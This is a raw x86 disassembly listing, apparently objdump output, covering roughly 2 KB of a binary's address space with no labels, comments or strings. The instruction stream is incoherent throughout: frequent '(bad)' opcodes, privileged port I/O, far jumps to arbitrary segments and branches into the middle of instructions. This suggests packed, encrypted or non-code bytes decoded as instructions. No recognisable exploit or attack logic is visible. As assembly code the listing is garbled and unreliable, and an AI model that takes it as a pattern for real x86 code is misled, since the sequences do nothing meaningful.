  42126c:	dec    ebp
  42126d:	jmp    0x4212d8
  42126f:	or     al,0xa7
  421271:	mov    ecx,ebp
  421273:	in     al,dx
  421274:	(bad)  
  421275:	(bad)  
  421276:	dec    edx
  421277:	(bad)  
  421278:	jle    0x421287
  42127a:	mov    al,0xae
  42127c:	fldenv [ebx+0x6964d04f]
  421282:	inc    ecx
  421283:	mov    esp,0xf4b424af
  421288:	out    dx,al
  421289:	or     ecx,ebp
  42128b:	repnz iret 
  42128d:	fs aaa 
  42128f:	fsubr  QWORD PTR [ebx+0x2c61d890]
  421295:	or     edx,DWORD PTR [ebp-0x35]
  421298:	add    al,0x39
  42129a:	xchg   ecx,eax
  42129b:	sti    
  42129c:	and    ah,dh
  42129e:	mov    ecx,DWORD PTR [esp+ecx*1]
  4212a1:	push   ecx
  4212a2:	iret   
  4212a3:	sar    BYTE PTR [ecx+0x7c],cl
  4212a6:	ror    DWORD PTR ds:0xed6b5033,1
  4212ac:	fs ret 
  4212ae:	mov    ah,0xb
  4212b0:	jne    0x421285
  4212b2:	inc    ecx
  4212b3:	adc    DWORD PTR [ebx],ecx
  4212b5:	and    DWORD PTR [esi-0x3e387050],esp
  4212bb:	pusha  
  4212bc:	out    0x82,eax
  4212be:	(bad)
  4212c3:	pop    esp
  4212c4:	iret   
  4212c5:	pop    es
  4212c6:	shl    DWORD PTR [esi+0x41],1
  4212c9:	add    BYTE PTR [edi+0x15],dh
  4212cc:	and    DWORD PTR [ebp+edi*1+0x4bd6a3f3],esi
  4212d3:	scas   eax,DWORD PTR es:[edi]
  4212d4:	pop    edi
  4212d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212d6:	in     eax,dx
  4212d7:	xchg   ecx,eax
  4212d8:	stc    
  4212d9:	rcr    BYTE PTR [esi-0x6],1
  4212dc:	out    dx,eax
  4212dd:	idiv   DWORD PTR [edx+0x3]
  4212e0:	or     dl,BYTE PTR [edi-0x3a]
  4212e3:	js     0x421285
  4212e5:	and    ecx,edx
  4212e7:	jle    0x4212b4
  4212e9:	jl     0x4212ee
  4212eb:	retf   0x533a
  4212ee:	cmp    al,0x1d
  4212f0:	addr16 sub al,0x3d
  4212f3:	jg     0x421357
  4212f5:	mov    bh,0xf9
  4212f7:	ret    
  4212f8:	(bad)  
  4212fa:	nop
  4212fb:	jg     0x42135a
  4212fd:	adc    edi,DWORD PTR [edx-0x6174afa5]
  421303:	popa   
  421304:	cmp    al,0x7b
  421306:	mov    esp,0x369aa367
  42130b:	xor    al,0x88
  42130d:	test   BYTE PTR [edx],al
  42130f:	inc    edx
  421310:	and    al,0x43
  421312:	or     BYTE PTR [ebx],bl
  421314:	add    DWORD PTR [edi-0x1eb0f0cd],ecx
  42131a:	lods   eax,DWORD PTR ds:[esi]
  42131b:	and    BYTE PTR [esi],cl
  42131d:	and    al,0x94
  42131f:	lahf   
  421320:	add    BYTE PTR [esi+0x5f345ce0],ah
  421326:	add    DWORD PTR ds:0x8da2cdb2,0xffffffe1
  42132d:	cli    
  42132e:	push   eax
  42132f:	add    esp,DWORD PTR [eax-0x7a]
  421332:	adc    eax,0xa3caff54
  421337:	pop    ebp
  421338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421339:	dec    ecx
  42133a:	dec    ecx
  42133b:	sbb    ebx,eax
  42133d:	das    
  42133e:	add    edi,DWORD PTR [edx-0x6d]
  421341:	int3   
  421342:	fdivr  QWORD PTR [ebx-0x1e]
  421345:	fs xchg edi,eax
  421347:	inc    esp
  421348:	jle    0x42132e
  42134a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42134b:	es in  eax,dx
  42134d:	adc    al,0x48
  42134f:	int    0x57
  421351:	pusha  
  421352:	jmp    0x5aaf648f
  421357:	lock stos DWORD PTR es:[edi],eax
  421359:	push   0x57c0becd
  42135e:	fs inc eax
  421360:	je     0x4212f6
  421362:	adc    bl,BYTE PTR [ebp+0x2c]
  421365:	pop    esi
  421366:	jecxz  0x421333
  421368:	je     0x42136d
  42136a:	rcr    BYTE PTR [esp+ebx*1],cl
  42136d:	xor    ah,BYTE PTR [esi-0x2ba97929]
  421373:	push   ecx
  421374:	jb     0x421357
  421376:	mov    edx,0xc8a47e8e
  42137b:	or     edx,DWORD PTR [ebx]
  42137d:	push   eax
  42137e:	or     ch,bh
  421380:	and    BYTE PTR [eax-0x555a71fb],dl
  421386:	ret    
  421387:	mov    edi,0xadb3e093
  42138c:	inc    ebp
  42138d:	inc    ebp
  42138e:	cmp    eax,0xcc929c0c
  421393:	lods   eax,DWORD PTR ds:[esi]
  421394:	scas   eax,DWORD PTR es:[edi]
  421395:	aad    0xc9
  421397:	scas   eax,DWORD PTR es:[edi]
  421398:	and    cl,BYTE PTR [ecx+0xb]
  42139b:	fs fs push cs
  42139e:	mov    al,0x35
  4213a0:	outs   dx,BYTE PTR ds:[esi]
  4213a1:	xchg   ebp,eax
  4213a2:	fmul   st,st(4)
  4213a4:	loop   0x4213ec
  4213a6:	aaa    
  4213a7:	imul   edx,DWORD PTR [ebp-0x19],0x22409e51
  4213ae:	pushf  
  4213af:	mov    bl,0x23
  4213b1:	(bad)  
  4213b2:	enter  0xf3e8,0xab
  4213b6:	or     DWORD PTR [ecx+0xb308000],ebx
  4213bc:	data16 in al,0xb1
  4213bf:	push   ebp
  4213c0:	lds    ebx,FWORD PTR [esi-0x6]
  4213c3:	pushf  
  4213c4:	jecxz  0x421442
  4213c6:	dec    ebx
  4213c7:	(bad)  
  4213c8:	pop    ds
  4213c9:	aas    
  4213ca:	js     0x42137c
  4213cc:	gs das 
  4213ce:	push   cs
  4213cf:	pop    esi
  4213d0:	shr    DWORD PTR [eax],1
  4213d2:	xchg   ebx,eax
  4213d3:	repnz cdq 
  4213d5:	ret    
  4213d6:	int    0x78
  4213d8:	and    ebx,DWORD PTR [edx+0xf9092c4]
  4213de:	sub    al,0x56
  4213e0:	xchg   DWORD PTR [esi-0x69],esi
  4213e3:	call   0xac85:0x3999dae3
  4213ea:	popa   
  4213eb:	les    ebx,FWORD PTR [eax+edx*2+0x51]
  4213ef:	js     0x421400
  4213f1:	and    esp,0x65
  4213f4:	call   0x78d5:0xc50cdd61
  4213fb:	cmp    ah,BYTE PTR [ecx+0x5cf88c8b]
  421401:	xchg   esp,eax
  421402:	out    0x9e,eax
  421404:	out    dx,eax
  421405:	sub    eax,eax
  421407:	(bad)  
  421408:	jbe    0x421427
  42140a:	icebp  
  42140b:	mov    eax,ds:0x1fc2e627
  421410:	sub    ecx,esi
  421412:	inc    edx
  421413:	jecxz  0x4213f5
  421415:	or     esi,ebx
  421417:	in     eax,0x3f
  421419:	xchg   edi,eax
  42141a:	dec    ebp
  42141b:	in     al,0xdd
  42141d:	shl    BYTE PTR [edx-0x1],0xf4
  421421:	xchg   edx,eax
  421422:	inc    edx
  421423:	pop    edx
  421424:	loope  0x4213e4
  421426:	cld    
  421427:	comiss xmm1,xmm4
  42142a:	push   0xe4d4b48c
  42142f:	test   BYTE PTR ds:0x469856c1,cl
  421435:	sbb    BYTE PTR [esp+eiz*2],0xe3
  421439:	push   cs
  42143a:	sbb    edi,DWORD PTR [esi+0x68]
  42143d:	and    eax,esi
  42143f:	lock (bad) 
  421441:	sbb    eax,0x76f16618
  421446:	hlt    
  421447:	(bad)  
  421448:	loop   0x421410
  42144a:	das    
  42144b:	adc    al,BYTE PTR [edx+0x13]
  42144e:	ret    
  42144f:	mov    eax,0xc69789d6
  421454:	mov    eax,0xb72137c6
  421459:	cmp    BYTE PTR [eax-0x6a],bl
  42145c:	sbb    DWORD PTR [eax-0xc],edi
  42145f:	lahf   
  421460:	sbb    al,ch
  421462:	sbb    ecx,eax
  421464:	pop    edx
  421465:	jge    0x42140f
  421467:	test   BYTE PTR [edi+0x6f4aa4e6],0xd0
  42146e:	jge    0x4214c0
  421470:	jle    0x4214b7
  421472:	inc    edx
  421473:	aaa    
  421474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421475:	sahf   
  421476:	mov    ecx,DWORD PTR [eax]
  421478:	cmp    ecx,DWORD PTR [ecx+0x1f]
  42147b:	xchg   edi,eax
  42147c:	imul   edx,DWORD PTR [ecx],0xbdcae195
  421482:	xor    bl,BYTE PTR [ebx+ebx*2-0x7a]
  421486:	push   ebx
  421487:	cmp    BYTE PTR ds:0x78779042,al
  42148d:	pop    ebp
  42148e:	xlat   BYTE PTR ds:[ebx]
  42148f:	xor    dl,BYTE PTR [eax+0x6f]
  421492:	setp   ch
  421495:	repz iret 
  421497:	mov    ds:0x8be3587f,eax
  42149c:	or     DWORD PTR [ecx-0x39],0xffffffc1
  4214a0:	js     0x42143d
  4214a2:	sbb    al,BYTE PTR [edi+0x5f]
  4214a5:	les    eax,FWORD PTR [esi+0x706d514b]
  4214ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214ac:	sub    eax,edi
  4214ae:	mov    ebx,0x6779d9a7
  4214b3:	or     BYTE PTR ds:0xd5ab86ce,dl
  4214b9:	jae    0x421457
  4214bb:	mov    ah,0x1
  4214bd:	push   ecx
  4214be:	sbb    ecx,DWORD PTR [ebx+edx*8]
  4214c1:	push   ss
  4214c2:	pop    es
  4214c3:	dec    esp
  4214c4:	pop    ebp
  4214c5:	jmp    0x4214c2
  4214c7:	xlat   BYTE PTR ds:[ebx]
  4214c8:	in     eax,0xb7
  4214ca:	pop    ss
  4214cb:	dec    esi
  4214cc:	xchg   ebx,eax
  4214cd:	(bad)  
  4214ce:	gs add eax,0xada190a0
  4214d4:	sti    
  4214d5:	adc    bl,BYTE PTR [edx+0x66fac516]
  4214db:	retf   0x2034
  4214de:	in     al,0x79
  4214e0:	arpl   ax,cx
  4214e2:	mov    edi,0xfe661799
  4214e7:	lock push cs
  4214e9:	mov    ah,0x65
  4214eb:	push   ds
  4214ec:	fst    DWORD PTR [ebx-0x40465f9b]
  4214f2:	outs   dx,BYTE PTR ds:[esi]
  4214f3:	sar    BYTE PTR [ebp-0x33a09b88],0x86
  4214fa:	out    0x28,eax
  4214fc:	ret    0xded7
  4214ff:	mov    dl,BYTE PTR [edi+edi*2+0x64]
  421503:	lds    eax,FWORD PTR [ebp-0x6f5400f3]
  421509:	ret    
  42150a:	faddp  st(7),st
  42150c:	xor    DWORD PTR [ecx+eax*2+0x16],esp
  421510:	clc    
  421511:	sbb    DWORD PTR [ebx-0xa0496fd],esi
  421517:	push   edx
  421518:	pop    ds
  421519:	inc    edi
  42151a:	and    ch,BYTE PTR [ebx]
  42151c:	cld    
  42151d:	in     eax,0x0
  42151f:	scas   al,BYTE PTR es:[edi]
  421520:	xchg   ebx,eax
  421521:	dec    ebx
  421522:	retf   
  421523:	in     al,dx
  421524:	xor    DWORD PTR [ecx+0x6],edx
  421527:	xchg   ecx,eax
  421528:	add    DWORD PTR [esi],ebx
  42152a:	xor    al,0xac
  42152c:	dec    ecx
  42152d:	dec    ebp
  42152e:	xchg   edi,eax
  42152f:	adc    ebp,DWORD PTR [eax]
  421531:	loop   0x421534
  421533:	loop   0x4215b1
  421535:	retf   0x218c
  421538:	stos   DWORD PTR es:[edi],eax
  421539:	mov    eax,ds:0x75c82360
  42153e:	lds    ecx,FWORD PTR [esi]
  421540:	cmc    
  421541:	push   esi
  421542:	nop
  421543:	jbe    0x4215aa
  421545:	xchg   edi,eax
  421546:	lods   al,BYTE PTR ds:[esi]
  421547:	sbb    edx,DWORD PTR [esi]
  421549:	pop    edx
  42154a:	fidivr DWORD PTR [esi]
  42154c:	pop    ds
  42154d:	inc    esi
  42154e:	lock sub eax,0xbed1a01e
  421554:	ret    
  421555:	jmp    0x27bd:0xcdd30380
  42155c:	rcr    DWORD PTR [ebx],1
  42155e:	popa   
  42155f:	xchg   esi,eax
  421560:	push   es
  421561:	(bad)  
  421562:	dec    eax
  421563:	jg     0x4215c0
  421565:	and    eax,0xf246b565
  42156a:	dec    edx
  42156b:	mov    ds:0xfcde75b1,al
  421570:	dec    edi
  421571:	mov    cl,0x37
  421573:	call   0x4fac8e30
  421578:	ja     0x421518
  42157a:	adc    al,0x79
  42157c:	cli    
  42157d:	shr    DWORD PTR [ecx-0x69ca6986],cl
  421583:	jno    0x4215a5
  421585:	mov    eax,ds:0x45aa1627
  42158a:	retf   
  42158b:	(bad)  
  42158d:	jp     0x42160b
  42158f:	lock mov WORD PTR [edx],gs
  421592:	shr    DWORD PTR ds:0x648b058d,0xc9
  421599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42159a:	sti    
  42159b:	hlt    
  42159c:	cmp    edi,edi
  42159e:	sub    bh,BYTE PTR [edi-0x31e10cbf]
  4215a4:	arpl   WORD PTR [esi+0x595d4d5e],ax
  4215aa:	enter  0xf27a,0xaf
  4215ae:	sub    DWORD PTR [edi-0x67f8ea80],0x4bc85808
  4215b8:	aad    0x46
  4215ba:	jl     0x4215ba
  4215bc:	jp     0x4215ec
  4215be:	pop    es
  4215bf:	ret    0x8d11
  4215c2:	lds    ecx,FWORD PTR [edi]
  4215c4:	add    al,0x9e
  4215c6:	sub    eax,0x66aa77fd
  4215cb:	clc    
  4215cc:	aaa    
  4215cd:	jg     0x4215e5
  4215cf:	push   eax
  4215d0:	push   0x3a646da0
  4215d5:	add    eax,0x1384bdea
  4215da:	loope  0x421592
  4215dc:	xchg   ebp,eax
  4215dd:	(bad)  
  4215de:	gs push cs
  4215e0:	xchg   esi,eax
  4215e1:	fcomp  QWORD PTR ds:0xa4d3199e
  4215e7:	icebp  
  4215e8:	lahf   
  4215e9:	push   ebx
  4215ea:	call   0x6e235b69
  4215ef:	push   ebp
  4215f0:	pop    ebx
  4215f1:	dec    ebx
  4215f2:	push   es
  4215f3:	dec    ebx
  4215f4:	or     edi,DWORD PTR [eax]
  4215f6:	loopne 0x4215e0
  4215f8:	inc    esp
  4215f9:	sbb    DWORD PTR [ebp-0x20],eax
  4215fc:	add    ebx,DWORD PTR [esi]
  4215fe:	xchg   ebx,eax
  4215ff:	scas   al,BYTE PTR es:[edi]
  421600:	jbe    0x4215d6
  421602:	mov    eax,ds:0x75ecc27b
  421607:	outs   dx,BYTE PTR ds:[esi]
  421608:	sbb    al,0x5b
  42160a:	in     eax,0x2f
  42160c:	xor    BYTE PTR [ebp+0x1e],ah
  42160f:	cmp    eax,0x8477f608
  421614:	jo     0x421636
  421616:	push   0x50241f36
  42161b:	(bad)
  42161f:	cwde   
  421620:	fld    TBYTE PTR [ecx+ecx*8]
  421623:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  421625:	inc    edx
  421626:	(bad)  
  421627:	sti    
  421628:	xor    eax,0x773ee65a
  42162d:	aad    0xfa
  42162f:	int3   
  421630:	mov    edi,0x1e1594d6
  421635:	popw   ds
  421637:	add    DWORD PTR [ebx],edi
  421639:	sbb    al,bl
  42163b:	retf   
  42163c:	or     BYTE PTR fs:[ebp-0x5680e196],dh
  421643:	sub    al,0x5b
  421645:	ffreep st(4)
  421647:	outs   dx,DWORD PTR ds:[esi]
  421648:	jo     0x421647
  42164a:	imul   eax,DWORD PTR [eax+0x2d],0x991fda8b
  421651:	jle    0x421636
  421653:	push   0xffffffbb
  421655:	mov    dl,0x69
  421657:	dec    eax
  421658:	ret    0xe800
  42165b:	jnp    0x421607
  42165d:	inc    edx
  42165e:	inc    ebp
  42165f:	mov    cl,0x99
  421661:	jo     0x421684
  421663:	sbb    DWORD PTR ds:0x491dce4c,0xc84cc974
  42166d:	and    BYTE PTR ds:0xab833d4d,ah
  421673:	xchg   edx,eax
  421674:	and    BYTE PTR [edi],cl
  421676:	xchg   DWORD PTR [eax-0x12],edi
  421679:	test   eax,0x2f1b2df8
  42167e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42167f:	daa    
  421680:	out    dx,al
  421681:	mul    DWORD PTR [ebp+edi*8-0x48]
  421685:	int3   
  421686:	arpl   WORD PTR [edx],bp
  421688:	push   edi
  421689:	mov    esp,0xb7f55c65
  42168e:	push   ds
  42168f:	adc    al,0x28
  421691:	lock or DWORD PTR [ebp-0x2],esp
  421695:	dec    edx
  421696:	cmp    cl,BYTE PTR [edi]
  421698:	pop    esp
  421699:	loop   0x4216b2
  42169b:	add    eax,0x44a95d9a
  4216a0:	in     al,0xae
  4216a2:	cmp    edi,DWORD PTR [edi]
  4216a4:	hlt    
  4216a5:	lea    esi,[edx]
  4216a7:	or     BYTE PTR ds:0x3522870,ch
  4216ad:	xor    bh,BYTE PTR [esi+eiz*8+0x11]
  4216b1:	adc    edx,edi
  4216b3:	pop    edi
  4216b4:	pop    es
  4216b5:	and    BYTE PTR [esp+eax*8],dl
  4216b8:	and    eax,0xaa2d916c
  4216bd:	mov    edi,0x60b8f755
  4216c2:	clc    
  4216c3:	(bad)  
  4216c4:	call   DWORD PTR [ecx-0x27]
  4216c7:	cdq    
  4216c8:	daa    
  4216c9:	in     eax,dx
  4216ca:	out    dx,eax
  4216cb:	fdivr  QWORD PTR [ebp+0x52]
  4216ce:	xchg   esp,eax
  4216cf:	lahf   
  4216d0:	int    0x15
  4216d2:	fldenv [eax+0x53ff19fc]
  4216d8:	xchg   ebp,eax
  4216d9:	push   ss
  4216da:	mov    ch,cl
  4216dc:	push   edi
  4216dd:	lods   al,BYTE PTR ds:[esi]
  4216de:	fwait
  4216df:	or     DWORD PTR [edx+0x6ee2a0a2],eax
  4216e5:	push   ss
  4216e6:	xor    edi,0xffffffb2
  4216e9:	push   ss
  4216ea:	lea    esp,[edx-0x4a711c2b]
  4216f0:	push   cs
  4216f1:	gs sub al,0x85
  4216f4:	imul   ebx,ecx,0xd64ce0c4
  4216fa:	pop    esi
  4216fb:	das    
  4216fc:	push   ecx
  4216fd:	int3   
  4216fe:	in     eax,dx
  4216ff:	jg     0x421706
  421701:	sbb    ch,BYTE PTR [ebx-0x3959b460]
  421707:	xor    DWORD PTR [edx+ebx*8-0x53],ebp
  42170b:	out    dx,al
  42170c:	fsub   QWORD PTR [edx]
  42170e:	out    0x7b,al
  421710:	ss mov bh,0xd9
  421713:	dec    ecx
  421714:	sar    DWORD PTR [esi+0xc],1
  421717:	fwait
  421718:	push   ebp
  421719:	mov    cl,0x5f
  42171b:	xor    dl,dl
  42171d:	sub    DWORD PTR [ebx-0x617f5757],ecx
  421723:	sub    al,0x15
  421725:	push   0xfffffff4
  421727:	pop    esi
  421728:	sbb    bl,BYTE PTR [esi+0x14a6bc44]
  42172e:	cld    
  42172f:	push   esp
  421730:	and    bh,al
  421732:	sbb    eax,0x87564d97
  421737:	inc    edx
  421738:	or     BYTE PTR [ebp+0x4c],dl
  42173b:	fild   QWORD PTR [edx-0x6c78b0ed]
  421741:	daa    
  421742:	rcl    BYTE PTR [ecx],1
  421744:	jae    0x421768
  421746:	dec    edi
  421747:	lods   eax,DWORD PTR ds:[esi]
  421748:	sub    ecx,0x976f50d
  42174e:	cmp    cl,cl
  421750:	(bad)  
  421751:	imul   eax,DWORD PTR [edx],0x7a486524
  421757:	jo     0x4217cc
  421759:	mov    edi,0x8d4fa567
  42175e:	sub    al,0x56
  421760:	sti    
  421761:	loop   0x4217d4
  421763:	or     eax,0x5b50270
  421768:	xor    eax,0x8fa7f35b
  42176d:	std    
  42176e:	mov    ds:0x4a2bff76,eax
  421773:	cmp    esi,esp
  421775:	mov    ch,0x6e
  421777:	push   es
  421778:	mov    esi,0xe97ea904
  42177d:	loopne 0x421770
  42177f:	aas    
  421780:	dec    esi
  421781:	repz repz pop esp
  421784:	jp     0x421777
  421786:	xchg   edi,eax
  421787:	cmp    eax,0xad4027d
  42178c:	outs   dx,DWORD PTR ds:[esi]
  42178d:	xor    eax,0xd9815d54
  421792:	xchg   edi,eax
  421793:	mov    ah,0x51
  421795:	and    al,bh
  421797:	adc    DWORD PTR [edi-0x13],edi
  42179a:	jmp    0xb25a2bb2
  42179f:	xor    al,0x36
  4217a1:	fld    TBYTE PTR [ecx+0x21285b1c]
  4217a7:	outs   dx,DWORD PTR ds:[esi]
  4217a8:	cmp    ah,ch
  4217aa:	sbb    BYTE PTR [ebx+0x49],bh
  4217ad:	sbb    BYTE PTR [edi-0x50],0x87
  4217b1:	les    edx,FWORD PTR [ebp-0x9d85d79]
  4217b7:	push   ds
  4217b8:	jmp    0x4217b9
  4217ba:	pop    ecx
  4217bb:	push   edx
  4217bc:	pushf  
  4217bd:	push   ecx
  4217be:	out    dx,al
  4217bf:	in     eax,dx
  4217c0:	xchg   ebp,eax
  4217c1:	or     BYTE PTR [edx],dl
  4217c3:	repz xchg ecx,eax
  4217c5:	jle    0x4217e7
  4217c7:	outs   dx,DWORD PTR ds:[esi]
  4217c8:	jle    0x421845
  4217ca:	(bad)  
  4217cb:	mov    esi,0xf9e05394
  4217d0:	cmp    DWORD PTR [ebp+0x1d5c3a6d],edx
  4217d6:	ficom  DWORD PTR [esi]
  4217d8:	lea    ecx,[esi+ebp*4-0x4c]
  4217dc:	sub    dh,BYTE PTR [edx]
  4217de:	jge    0x421776
  4217e0:	inc    ebp
  4217e1:	mov    al,ds:0xd63df0d5
  4217e6:	cmp    eax,0x6200a6cf
  4217eb:	sub    edi,DWORD PTR [esi-0xb]
  4217ee:	int    0x69
  4217f0:	and    bl,cl
  4217f2:	test   DWORD PTR [eax],edi
  4217f4:	jge    0x4217e3
  4217f6:	inc    ebp
  4217f7:	adc    BYTE PTR [ebx+0x53d5b9aa],0x7f
  4217fe:	and    eax,0x6fa20d1e
  421803:	shl    DWORD PTR [eax-0x3615817c],1
  421809:	ror    DWORD PTR [ecx-0x5fe11b9f],cl
  42180f:	enter  0x24e5,0xa2
  421813:	sbb    BYTE PTR [edx],dh
  421815:	pop    esi
  421816:	mov    WORD PTR [ebx+0x39],ss
  421819:	sahf   
  42181a:	aam    0xf2
  42181c:	outs   dx,DWORD PTR ds:[esi]
  42181d:	push   es
  42181e:	xor    al,0x6f
  421820:	das    
  421821:	jb     0x42189a
  421823:	jmp    0xaee33a29
  421828:	mov    ds,ebx
  42182a:	dec    edx
  42182b:	shl    BYTE PTR [edi],cl
  42182d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42182e:	(bad)  
  42182f:	pop    edi
  421830:	sbb    DWORD PTR [ebx],ebx
  421832:	and    al,al
  421834:	push   ss
  421835:	mov    es,ebx
  421837:	pop    ebp
  421838:	cmp    BYTE PTR [ebx+0x34],0xce
  42183c:	les    esp,FWORD PTR [ecx-0x74]
  42183f:	dec    edi
  421840:	adc    BYTE PTR [esi+eax*8],0xdd
  421844:	jns    0x421811
  421846:	mov    esp,0x7edd7fbf
  42184b:	ins    DWORD PTR es:[edi],dx
  42184c:	cli    
  42184d:	pusha  
  42184e:	xchg   ebx,eax
  42184f:	mov    esp,0x90bbe8fb
  421854:	cdq    
  421855:	adc    eax,0xffffff95
  421858:	inc    edx
  421859:	cli    
  42185a:	ins    BYTE PTR es:[edi],dx
  42185b:	sbb    ax,0x6434
  42185f:	enter  0x37fd,0xf
  421863:	mov    ah,0x2c
  421865:	(bad)  
  421866:	and    al,0x9c
  421868:	pop    eax
  421869:	ins    BYTE PTR es:[edi],dx
  42186a:	shl    DWORD PTR [ebx+0x52],cl
  42186d:	jge    0x42185a
  42186f:	cmp    eax,0x2484f9f7
  421874:	adc    BYTE PTR [eax+0x74],bl
  421877:	or     eax,0x2aa06c4a
  42187c:	mov    ds:0xabefa88d,eax
  421881:	sti    
  421882:	int    0x24
  421884:	sti    
  421885:	shl    DWORD PTR [edx-0x77],cl
  421888:	loopne 0x4218f4
  42188a:	stc    
  42188b:	repnz sbb BYTE PTR [ecx-0x14],0xd1
  421890:	inc    ebx
  421891:	repnz nop
  421893:	cmp    ah,bh
  421895:	jb     0x42183d
  421897:	das    
  421898:	inc    edi
  421899:	cwde   
  42189a:	bound  ecx,QWORD PTR [ecx]
  42189c:	mov    gs,WORD PTR [eax]
  42189e:	sar    edx,cl
  4218a0:	ror    BYTE PTR [edi],cl
  4218a2:	jno    0x4218e2
  4218a4:	sysenter 
  4218a6:	ins    BYTE PTR es:[edi],dx
  4218a7:	mov    WORD PTR [edx-0x4c350384],ss
  4218ad:	sahf   
  4218ae:	sbb    BYTE PTR [edi-0x6b06046b],0x71
  4218b5:	mov    BYTE PTR [esi+0x739ade3],cl
  4218bb:	push   cs
  4218bc:	mov    dl,0x1
  4218be:	stos   BYTE PTR es:[edi],al
  4218bf:	std    
  4218c0:	mov    bh,0xfb
  4218c2:	rcr    BYTE PTR [eax+0x45],1
  4218c5:	dec    ebx
  4218c6:	jle    0x42184e
  4218c8:	cmp    eax,0x8997c9ec
  4218cd:	push   cs
  4218ce:	arpl   dx,si
  4218d0:	cmp    BYTE PTR [ebp-0x21fc1e5d],0xf7
  4218d7:	push   ds
  4218d8:	mov    ds:0xb2a3357d,al
  4218dd:	add    eax,DWORD PTR [eax]
  4218df:	pop    es
  4218e0:	mov    al,ds:0xe1e0aeb1
  4218e5:	sub    al,0x4a
  4218e7:	fistp  WORD PTR [esi-0x33bb4640]
  4218ed:	pop    esp
  4218ee:	ror    BYTE PTR ds:0xbf1ff461,cl
  4218f4:	clc    
  4218f5:	imul   eax,DWORD PTR [edx+0x3bfa7da7],0x1c
  4218fc:	out    0xb5,eax
  4218fe:	ss jne 0x421902
  421901:	xchg   ebp,eax
  421902:	jns    0x421958
  421904:	lock cld 
  421906:	mov    edi,0xa1a6f044
  42190b:	adc    cl,bh
  42190d:	cli    
  42190e:	pusha  
  42190f:	leave  
  421910:	mov    dl,0xe5
  421912:	fsubr  QWORD PTR [edx]
  421914:	jecxz  0x4218e1
  421916:	fisubr WORD PTR [eax+0x69]
  421919:	or     dl,0xb5
  42191c:	mov    ebx,0xa250a26f
  421921:	rcr    DWORD PTR [edi+0x5af9ea65],cl
  421927:	int    0xe2
  421929:	into   
  42192a:	jmp    0x73f5:0x84ceffe7
  421931:	inc    eax
  421932:	pop    ebx
  421933:	stos   BYTE PTR es:[edi],al
  421934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421935:	pop    edx
  421936:	outs   dx,DWORD PTR ds:[esi]
  421937:	iret   
  421938:	repnz mov BYTE PTR [esi+0x32],bl
  42193c:	pop    eax
  42193d:	lock es (bad) 
  421940:	in     al,dx
  421941:	loopne 0x421925
  421943:	sub    eax,0x8be1ffc0
  421948:	cdq    
  421949:	scas   eax,DWORD PTR es:[edi]
  42194a:	sub    BYTE PTR [esi+0x77896da2],cl
  421950:	fcmovb st,st(5)
  421952:	cmp    al,0x8b
  421954:	mov    dh,dl
  421956:	cli    
  421957:	cli    
  421958:	arpl   WORD PTR [ebx-0x18aa0900],bp
  42195e:	cld    
  42195f:	enter  0xfd0f,0x5
  421963:	xchg   ebx,eax
  421964:	loopne 0x421971
  421966:	xchg   esp,eax
  421967:	pop    eax
  421968:	fwait
  421969:	add    ecx,DWORD PTR [eax+0x6e98fc78]
  42196f:	(bad)  
  421971:	jae    0x421907
  421973:	in     al,dx
  421974:	bound  ebx,QWORD PTR [edi-0x530c30d3]
  42197a:	dec    esi
  42197b:	pop    ss
  42197c:	cmp    esi,DWORD PTR fs:[esi-0x188bea3]
  421983:	shl    DWORD PTR [ebp+ebx*1-0x2329c452],cl
  42198a:	(bad)  
  42198c:	sbb    dh,BYTE PTR [edx]
  42198e:	cld    
  42198f:	push   ebp
  421990:	ins    BYTE PTR es:[edi],dx
  421991:	fistp  QWORD PTR [eax-0x5]
  421994:	jp     0x421988
  421996:	mov    dl,0xe7
  421998:	fwait
  421999:	cmp    DWORD PTR [esi-0x44],ebx
  42199c:	mov    ah,ch
  42199e:	(bad)  
  42199f:	daa    
  4219a0:	mov    ch,al
  4219a2:	push   edi
  4219a3:	ins    BYTE PTR es:[edi],dx
  4219a4:	mov    ds:0xf53c03d1,eax
  4219a9:	ins    DWORD PTR es:[edi],dx
  4219aa:	repnz mov ebx,0x69f099c3
  4219b0:	pusha  
  4219b1:	sbb    al,0xfd
  4219b3:	push   ebp
  4219b4:	pop    ecx
  4219b5:	xor    bh,BYTE PTR [esi-0xf]
  4219b8:	in     al,dx
  4219b9:	xor    ah,dh
  4219bb:	and    DWORD PTR [eax+ebx*8+0xa5b40cc],eax
  4219c2:	sbb    DWORD PTR [esi],0x43502794
  4219c8:	xchg   edi,eax
  4219c9:	mov    eax,0xf42acc5
  4219ce:	inc    ebx
  4219cf:	es test eax,0x1a2602bf
  4219d5:	xchg   esp,eax
  4219d6:	scas   eax,DWORD PTR es:[edi]
  4219d7:	mov    ch,0xe2
  4219d9:	test   BYTE PTR [ebp+0x20906f38],0x57
  4219e0:	test   DWORD PTR [ecx],0xdee6681f
  4219e6:	and    BYTE PTR [esi],cl
  4219e8:	jmp    0x379a248
  4219ed:	into   
  4219ee:	xchg   edx,eax
  4219ef:	fdivr  st(1),st
  4219f1:	jnp    0x421a58
  4219f3:	add    al,0x50
  4219f5:	(bad)  
  4219f6:	popa   
  4219f7:	adc    eax,edi
  4219f9:	xor    DWORD PTR [ecx-0x3c2d9c],ecx
  4219ff:	(bad)  
  421a00:	das    
  421a01:	retf   0x3fa6
  421a04:	sub    dh,BYTE PTR [edi]
  421a06:	inc    edi
  421a07:	cld    
  421a08:	xor    eax,0xa1656b8
  421a0d:	test   BYTE PTR [ebx-0x53],al
  421a10:	into   
  421a11:	out    dx,al
  421a12:	pop    ebp
  421a13:	shl    BYTE PTR es:[ecx],1
  421a16:	adc    bl,ah
  421a18:	stos   BYTE PTR es:[edi],al
  421a19:	jno    0x42199b
  421a1b:	cmp    BYTE PTR [edi+edi*4-0x1e],dl
  421a1f:	ins    BYTE PTR es:[edi],dx
  421a20:	jl     0x421a20
  421a22:	sub    DWORD PTR [esi-0x5],0xf213cea3
